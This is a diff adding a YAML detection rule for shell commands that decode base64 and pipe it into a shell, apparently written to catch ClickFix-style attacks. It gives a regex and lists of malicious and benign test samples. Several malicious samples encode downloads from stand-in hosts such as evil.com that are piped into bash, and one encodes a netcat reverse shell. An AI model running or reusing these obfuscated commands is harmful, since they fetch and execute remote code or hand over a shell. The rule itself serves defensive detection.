@@ -1,0 +1,56 @@
+name: high-01-base64-shell-decode
+severity: high
+description: >
+  Detects base64 encoded commands decoded and executed in shell. Common in Linux/macOS ClickFix attacks.
+
+pattern: |
+  (?i)echo.*\|.*base64.*(--decode|-d)|base64.*(--decode|-d).*\|.*(bash|sh|zsh|eval)
+
+malicious:
+  - 'bash -c "echo SGFja2Vk | base64 -d | bash"'
+  - 'sh -c "echo $(echo ZXZpbF9jb21tYW5k | base64 -d)"'
+  - 'sh -c "echo SGFja2VyX2NvbW1hbmQ= | base64 --decode | sh"'
+  - 'bash -c "echo Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaA== | base64 -d"'
+  - 'sh -c "echo cHdkOyBjdXJsIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnNo | base64 -d"'
+  - 'bash -c "echo d2dldCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaA== | base64 --decode | bash"'
+  - 'sh -c "echo Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL2Ryb3BwZXIuc2g= | base64 -d | sh"'
+  - 'bash -c "echo bmMgLWUgL2Jpbi9iYXNoIGV2aWwuY29tIDQ0NDQ= | base64 -d"'
+  - 'sh -c "echo cHl0aG9uIC1jICdleGVjKC4uLik=' | base64 --decode"'
+  - 'bash -c "echo $(echo bWFsaWNpb3VzX2NvbW1hbmQ= | base64 -d)"'
+  - "echo Y3VybCBodHRwOi8vZXZpbC5jb20vc2NyaXB0LnNofGJhc2g= | base64 -d | bash"
+  - "echo d2dldCAtcU8tIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnNofHNo | base64 --decode | sh"
+  - "echo SGFja2VyIHBheWxvYWQ= | base64 -d | eval"
+  - 'eval "$(echo ZXZpbCBjb21tYW5k | base64 -d)"'
+  - "(echo bWFsaWNpb3VzX2NvbW1hbmQ= | base64 -d) | bash"
+  - "echo Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL21hbHdhcmUuc2ggfCBiYXNo | base64 --decode | bash"
+  - "echo $(echo ZG93bmxvYWQgYW5kIGV4ZWN1dGU= | base64 -d | sh)"
+  - 'bash -c "echo cHl0aG9uIC1jIGltcG9ydCB1cmxsaWI= | base64 -d"'
+  - 'zsh -c "echo Y3VybCBodHRwOi8vbWFsd2FyZS5jb20= | base64 -d | zsh"'
+  - "echo SGFja2VkIQ== | base64 --decode | bash"
+
+benign:
+  - "bash script.sh"
+  - "sh -c 'ls -la'"
+  - "bash -c 'pwd'"
+  - "sh test.sh"
+  - "bash -c 'date'"
+  - "sh -c 'whoami'"
+  - "bash -c 'grep pattern file.txt'"
+  - "sh -c 'ps aux'"
+  - "bash -c 'uname -a'"
+  - "sh -c 'cd /home && ls'"
+  - 'bash -c "echo Hello World"'
+  - "sh -c 'cat file.txt'"
+  - "bash -c 'df -h'"
+  - "sh -c 'netstat -an'"
+  - 'bash -c "echo $PATH"'
+  - "sh local_script.sh"
+  - "bash /usr/local/bin/script.sh"
+  - "sh -c 'find . -name \"*.log\"'"
+  - "bash -c 'tail -f /var/log/syslog'"
+  - "sh -c 'top -b -n 1'"
+  - "echo test"
+  - "base64 file.txt"
+  - "echo Hello | base64"
+  - "bash -c 'echo test > file.txt'"
+  - "zsh -c 'pwd'"
